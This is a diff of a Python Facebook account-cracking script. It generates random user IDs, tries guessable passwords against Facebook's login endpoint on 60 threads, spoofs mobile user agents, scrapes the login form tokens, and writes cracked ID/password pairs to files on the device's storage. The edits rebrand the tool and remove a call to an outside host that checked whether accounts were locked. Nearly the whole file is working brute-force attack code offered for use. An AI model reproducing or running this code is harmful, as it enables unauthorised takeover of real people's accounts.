@@ -12,18 +12,7 @@ except ModuleNotFoundError:
         os.system(f'pip install requests futures==2 > /dev/null')
 except:pass
 logo = """ 
-\033[1;33m  ░█▀▀▀█ ░█─░█ ─█▀▀█ ░█▄─░█ ▀▀█▀▀ ░█▀▀▀█ 
-\033[1;32m  ─▀▀▀▄▄ ░█▀▀█ ░█▄▄█ ░█░█░█ ─░█── ░█──░█ 
-\033[1;36m  ░█▄▄▄█ ░█─░█ ░█─░█ ░█──▀█ ─░█── ░█▄▄▄█
-                                                 
-\033[1;91m\033[1;41m\033[1;97m              WELCOME TO SHANTO TOOLS               \033[;0m\033[1;91m\033[1;92m
-
-\033[1;92m══════════════════════════════════════════
-\033[1;32m[-] TOOLS TYPE:\033[1;32m PRIVATE
-\033[1;32m[-] AUTHOR    :\033[1;32m SHANTO 
-\033[1;32m[-] GITHUB    :\033[1;32m SHANTO
-\033[1;32m[-] FACEBOOK  :\033[1;32m SH AN TO
-\033[1;92m══════════════════════════════════════════
+HELLO WORLD
 """
 ok = []
 cp = []
@@ -48,33 +37,17 @@ ua = 'Dalvik/2.1.0 (Linux; U; Android 18; SC-99359f Build/OPM4.579514.034) [FBAN
 ua = 'Dalvik/2.1.0 (Linux; U; Android 10; Redmi 14099w Build/OPM4.579514.034) [FBAN/FB4A;FBAV/4743.0.0.808.9[FBAN/FB4A;FBAV/7360.0.0.88.96;[FBAN/FB4A;FBAV/628.0.0.88.96;[FBAN/FB4A;FBAV/4448.0.0.88.96;FBBV/17141943492;FBRV/0;FBPN/com.facebook.katana;FBLC/en_us;FBMF/Oppo;FBBD/Apple;FBDV/Redmi 14099w;FBSV/10;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=4213,height=3631};FB_FW/1;]'
 ua = 'Dalvik/2.1.0 (Linux; U; Android 5; SC-76753r Build/OPM4.579514.034) [FBAN/FB4A;FBAV/589.0.0.808.96[FBAN/FB4A;FBAV/9352.0.0.88.96;[FBAN/FB4A;FBAV/4379.0.0.88.96;[FBAN/FB4A;FBAV/8738.0.0.88.96;FBBV/22243748677;FBRV/0;FBPN/com.facebook.katana;FBLC/en_us;FBMF/Oppo;FBBD/Apple;FBDV/SC-76753r;FBSV/10;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=322,height=5573};FB_FW/1;]'
 ugen=[]
-
-#-------checker------#
-def lock_check(uid):
-    sessionx=requests.Session()
-    urlx=f'https://www.facebook.com/p/{uid}'
-    req=BeautifulSoup(sessionx.get(urlx).content,'html.parser')
-    tx=req.find('title').text
-    if tx =='Facebook':
-        return('LOCK')
-    else:
-        return('LIVE')
-        
-for xd in range(10000):
-    aa='Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S'
-    b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
-    c=' en-us; GT-'
-    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-    e=random.randrange(1, 999)
-    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-    g='; U; Bada/1.2; en-us) AppleWebKit/537.36 (KHTML, like Gecko) Dolfin/'
-    h=random.randrange(73,100)
-    i='0'
-    j=random.randrange(4200,4900)
-    k=random.randrange(40,150)
-    l='Mobile/18G82 [FBAN/FBIOS;FBAV/333.0.0.30.109;FBBV/313309308;FBDV/iPhone10,5;FBMD/iPhone;FBSN/iOS;FBSV/14.7.1;FBSS/3;FBID/phone;FBLC/pt_BR;FBOP/5;FBRV/315505842]'
-    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
-    ugen.append(uaku2)
+for ua in range(1000):
+      a='Mozilla/5.0 (Linux; Android'
+      b=random.choice(['12' , '13' , '14' , '15'])
+      c='SM-A125U Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
+      d=random.randrange(40,100)
+      e='0'
+      f=random.randrange(3000,6000)
+      g=random.randrange(20,100)
+      h='Mobile Safari/537.36'
+      ug=(f"{a} {b}; {c}{d}.{e}.{f}.{g} {h}")
+      ugen.append(ug)
 def Main():
 	os.system('clear')
 	print(logo)
@@ -87,7 +60,7 @@ def Main():
 		lovb = ''.join(random.choice(string.digits) for _ in range(2))
 		nmp = ''.join(random.choice(string.digits) for _ in range(4))
 		user.append(nmp)
-	with tred(max_workers=60) as yaari:
+	with tred(max_workers=60) as T-C-404:
 		os.system('clear')
 		print(logo)
 		tl = str(len(user))
@@ -97,8 +70,8 @@ def Main():
 		print(50*'━')
 		for guru in user:
 			uid = love+lova+lovb+guru
-			pwx = [lova+lovb+guru,love+lova+lovb,love+love,'bangladesh','sadiya','hridoy','sahin','nusrat','fatema','sabbir','mababa','708090','908070','free fire','freefire1234']
-			yaari.submit(test,uid,pwx,tl)
+			pwx = [lova+lovb+guru,love+lova+lovb,love+love]
+			T-C-404.submit(test,uid,pwx,tl)
 	print(50*'━')
 	print(' <> CRACK DONE......... ')
 	print(50*'━')
@@ -111,63 +84,53 @@ def test(uid,pwx,tl):
     try:
         for ps in pwx:
             session = requests.Session()
-            sys.stdout.write(f'\r\033[1;90m[\033[1;92mRJ-404\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
+            sys.stdout.write(f'\r\033[1;90m[\033[1;92mT-C-404\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
             sys.stdout.flush()
             pro = random.choice(ugen)
-            free_fb = session.get('https://x.facebook.com').text
+            free_fb = session.get('https://m.facebook.com').text
             log_data = {
-            "adid": str(uuid.uuid4()),
-            "device_id": str(uuid.uuid4()),
-            "email": uid,
-            "password": pww,
-            "cpl": "fales",
-            "source": "device_based_login",
-            "format": "json",
-            "generate_session_cookies": "1",
-            "generate_analytic_claims": "1",
-            "generate_machine_id": "1",
-            "locale": "GB",
-            "country_code": "GB",
-            "client_country_code": "GB",
-            "currently_logged_in_userid": "0",
-        }
-            header_freefb = ({'authority':'business.facebook.com',
-            "method": 'GET',
-            "scheme": 'https',
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-            'accept-encoding': 'gzip, deflate, br',
-            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
+                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
+            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
+            "try_number":"0",
+            "unrecognized_tries":"0",
+            "email":uid,
+            "pass":ps,
+            "login":"Log In"}
+            header_freefb = {'authority': 'p.facebook.com',
+            'method': 'GET',
+            'path': '/login/device-based/login/async/',
+            'scheme': 'https',
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'accept-language': 'en-US,en;q=0.9',
             'cache-control': 'max-age=0',
-            'content-type': 'application/x-www-form-urlencoded',
-            'referer': 'https://free.facebook.com/login/',
-            'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", "Not;A=Brand";v="99"',
-            'sec-ch-ua-mobile': '?0',
-            'sec-ch-ua-platform': '"Linux"',
+            'sec-ch-prefers-color-scheme': 'light',
+            'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
+            'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-ch-ua-platform-version': '"12.0.0"',
             'sec-fetch-dest': 'document',
             'sec-fetch-mode': 'navigate',
-            'sec-fetch-site': 'same-origin',
+            'sec-fetch-site': 'none',
             'sec-fetch-user': '?1',
             'upgrade-insecure-requests': '1',
-            'user-agent':pro,
-            'connection':'keep-alive'})
-            lo = session.post('https://x.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
+            'user-agent': pro}
+            lo = session.post('https://www.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[65:80]
-                res = requests.get(f"https://rajx.pythonanywhere.com/live/uid={cid}").text
-                if 'LOCK' in res:
-                    return 'LOCK'
-                else:
-                    print(f'\r\33[1;92m[RJ-404-OK] '+cid+' ¤ '+ps+'\33[0;92m')
+                print(f'\r\33[1;92m[T-C-404-OK] '+cid+' ¤ '+ps+'\33[0;92m')
                 oks.append(cid)
-                open('/sdcard/RJ-404-ok.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
+                open('/sdcard/T-C-404-ok.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
                 break
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[65:80]
-                print(f"\r\33[1;36m[RJ-404-CP] {uid} ¤ {ps}")
-                open('/sdcard/RJ-404-CP.txt', 'a').write( uid+' | '+ps+' \n')
+                print(f"\r\33[1;92m[T-C-404-CP] {uid} ¤ {ps}")
+                open('/sdcard/T-C-404-CP.txt', 'a').write( uid+' | '+ps+' \n')
                 cps.append(uid)
                 break
             else:
